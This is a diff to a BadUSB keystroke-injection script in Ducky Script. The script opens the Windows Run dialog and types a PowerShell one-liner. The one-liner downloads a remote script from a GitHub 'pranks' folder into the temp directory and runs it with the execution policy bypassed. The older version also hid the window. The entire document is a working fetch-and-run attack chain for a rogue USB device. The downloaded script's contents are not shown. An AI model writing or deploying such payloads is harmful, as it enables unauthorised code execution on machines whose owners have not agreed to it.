@@ -1,6 +1,6 @@
 DELAY 250
 GUI r
 DELAY 200
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pilot2254/badusb/main/payloads/pranks/beep-happybirthday/main.ps1' -OutFile '$env:temp\beep-happybirthday.ps1'; powershell -ExecutionPolicy Bypass -File '$env:temp\beep-happybirthday.ps1'"
-DELAY 100
+STRING powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pilot2254/badusb/main/payloads/pranks/beep-happybirthday/main.ps1' -OutFile '$env:TEMP\beep-happybirthday.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File', '$env:TEMP\beep-happybirthday.ps1'; Pause"
+DELAY 200
 ENTER
